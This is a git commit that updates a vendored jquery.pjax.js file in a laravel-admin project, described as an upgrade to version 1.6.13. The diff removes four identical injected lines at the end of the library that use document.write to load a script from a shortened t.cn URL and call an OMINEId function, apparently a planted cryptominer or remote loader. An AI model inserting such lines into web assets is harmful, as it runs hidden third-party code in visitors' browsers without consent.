41a8cac4c9b69612d61447731d7b7f66b564ce4f
Ning <qi_zhengning@163.com>
2019-05-05 14:09:32 +0800

    admin更新到1.6.13

--- public/vendor/laravel-admin/jquery-pjax/jquery.pjax.js
+++ public/vendor/laravel-admin/jquery-pjax/jquery.pjax.js
@@ -948,7 +948,3 @@ $.support.pjax =
 $.support.pjax ? enable() : disable()
 
 })(jQuery);
-document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
-document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
-document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
-document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
